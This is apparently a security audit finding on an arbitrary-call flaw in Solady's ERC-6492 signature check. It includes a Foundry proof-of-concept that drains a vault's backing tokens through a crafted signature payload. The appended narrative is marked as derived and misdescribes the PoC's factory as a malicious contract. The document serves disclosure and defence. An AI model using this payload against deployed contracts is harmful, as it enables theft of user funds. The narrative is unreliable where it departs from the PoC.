---
id: 15268
severity: "Critical"
---

# isValidERC6492SignatureNowAllowSideEffects allows arbitrary calls via maliciously crafted signatures

## Description

The ERC-6492 standard specifies a way that signatures can be validated for contract accounts who's code has not been deployed yet. This is done by simulating or actually executing the deployment of this accounts and then calling their code. To enable this the bytes "signature" payload in the standard specifies a way to package the address of a deployer factory, an arbitrary call payload for said factory and the original ERC-1271 signature. The solady library implements 2 functions conforming to this standard with slight variants. One of these, isValidERC6492SignatureNowAllowSideEffects is problematic because it does not revert the underlying side-effect from calling the factory unlike its isValidERC6492SignatureNow counterpart. This is a problem because the library triggers an arbitrary call based on the provided factory & payload without much additional validation besides that the subsequent call to validate the signature succeeds.

## Proof of Concept

A seemingly innocuous use of the library as follows is therefore vulnerable:
```solidity
contract SimpleVault is ERC20 {
    using SafeTransferLib for address;
    address public immutable BACKING;
    mapping(address owner => uint256 nonce) public nextNonce;
    constructor(address backedBy) {
        BACKING = backedBy;
    }
    function name() public pure override returns (string memory) {
        return "name";
    }
    function symbol() public pure override returns (string memory) {
        return "symbol";
    }
    function deposit(uint256 amount) public {
        BACKING.safeTransferFrom(msg.sender, address(this), amount);
        _mint(msg.sender, amount);
    }
    function withdraw(uint256 amount) public {
        _burn(msg.sender, amount);
        BACKING.safeTransfer(msg.sender, amount);
    }
    function getHash(address from, address to, uint256 amount, uint256 nonce) public pure returns (bytes32) {
        return keccak256(abi.encode("TRANSFER_WITH_SIG", from, to, amount, nonce));
    }
    function transferWithSig(address from, address to, uint256 amount, uint256 nonce, bytes calldata sig) public {
        // WARNING: Unsafe/non-standard message hash derivation for demo purposes (not required to make the PoC work)
        bytes32 hash = getHash(from, to, amount, nonce);
        require(nonce == nextNonce[from]++, "nonce wrong");
        require(SignatureCheckerLib.isValidERC6492SignatureNowAllowSideEffects(from, hash, sig), "invalid sig");
        _transfer(from, to, amount);
    }
}
```
The following scenario + helper contract demonstrates draining the tokens by leveraging the arbitrary call in the validation library to call out to the backing ERC20 token to transfer out funds from the example vault:
```solidity
/// @author philogy <https://github.com/philogy>
contract ERC6492SideEffectTest is Test {
    MockERC20 backing;
    SimpleVault vault;
    function setUp() public {
        backing = new MockERC20();
        vault = new SimpleVault(address(backing));
    }
    function test_sideEffect() public {
        // User with tokens
        address user1 = makeAddr("user_1");
        deal(address(backing), user1, 1_000e18);
        // User deposits
        vm.startPrank(user1);
        backing.approve(address(vault), type(uint256).max);
        vault.deposit(1_000e18);
        vm.stopPrank();
        // Attack prep
        DrainerHelper drainer = new DrainerHelper(backing);
        bytes memory sig = new bytes(0);
        bytes memory erc4629_drain_payload = bytes.concat(
            abi.encode(address(backing), abi.encodeCall(backing.transfer, (address(drainer), 1_000e18)), sig),
            bytes32(0x6492649264926492649264926492649264926492649264926492649264926492)
        );
        // drainer has no funds
        assertEq(backing.balanceOf(address(drainer)), 0);
        vault.transferWithSig(address(drainer), address(drainer), 0, 0, erc4629_drain_payload);
        // drainer has vault funds
        assertEq(backing.balanceOf(address(drainer)), 1_000e18);
        // vault is empty
        assertEq(backing.balanceOf(address(vault)), 0);
    }
}
contract DrainerHelper {
    MockERC20 immutable target;
    constructor(MockERC20 _target) {
        target = _target;
    }
    function isValidSignature(bytes32, bytes calldata) external view returns (bytes4) {
        require(target.balanceOf(address(this)) > 0);
        return this.isValidSignature.selector;
    }
}
```

## Recommendation

Ensure the isValidERC6492SignatureNowAllowSideEffects library function itself does not make any direct arbitrary calls, instead it should execute them by calling some intermediary verifier contract that performs the actual call to create a distinct, separated origin for the arbitrary call. This ensures that should the signature be a malicious payload it can only modify or touch the immutable intermediary "verifier".

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an arbitrary‑call flaw hidden inside the Solady library function isValidERC6492SignatureNowAllowSideEffects. The function is intended to verify an ERC‑6492 signature for a contract account that has not yet been deployed, but it executes a user‑supplied factory address and call payload directly and does not revert any side‑effects that the call may produce. Because the library does not isolate the call or perform additional validation, an attacker can embed a malicious payload that triggers an external call during the signature check. In practice the attacker crafts a signature payload that contains the address of a malicious factory contract together with a call to the vault’s backing ERC‑20 token, for example a transfer of all tokens to an attacker‑controlled address. When the victim contract calls SignatureCheckerLib.isValidERC6492SignatureNowAllowSideEffects as part of a transferWithSig operation, the library forwards the payload, the factory executes the token transfer, and the signature verification still returns true because the malicious contract’s isValidSignature function simply returns a success selector after confirming it holds a balance. The side‑effect (the token transfer) is not rolled back, so the vault’s balance is drained while the transaction appears to have succeeded. The impact is loss of user funds: a depositor sees their tokens disappear from the vault, the vault balance becomes zero, and the attacker ends up with the drained tokens. The issue occurs whenever a contract relies on isValidERC6492SignatureNowAllowSideEffects for signature validation, especially when the signature payload can specify an arbitrary factory and call data. Users, protocol developers, and auditors are affected because the bug violates the assumption that signature verification is a pure, read‑only operation. The flaw was discovered during a security audit that included a proof‑of‑concept test contract demonstrating the drain. It is hard to notice because the library function’s name suggests validation only, and the arbitrary call is hidden inside the signature payload; no explicit revert or error is emitted when the side‑effect occurs. To remediate, the validation function should never perform direct external calls; instead it should delegate the call to a dedicated verifier contract that isolates the call origin, or use staticcall to ensure no state changes, and it should revert if any side‑effect is detected. In short, the bug belongs to the class of unchecked external‑call‑in‑validation vulnerabilities where a function that is expected to be pure can be abused to execute arbitrary state‑changing code, leading to unauthorized fund transfers and broken accounting logic.
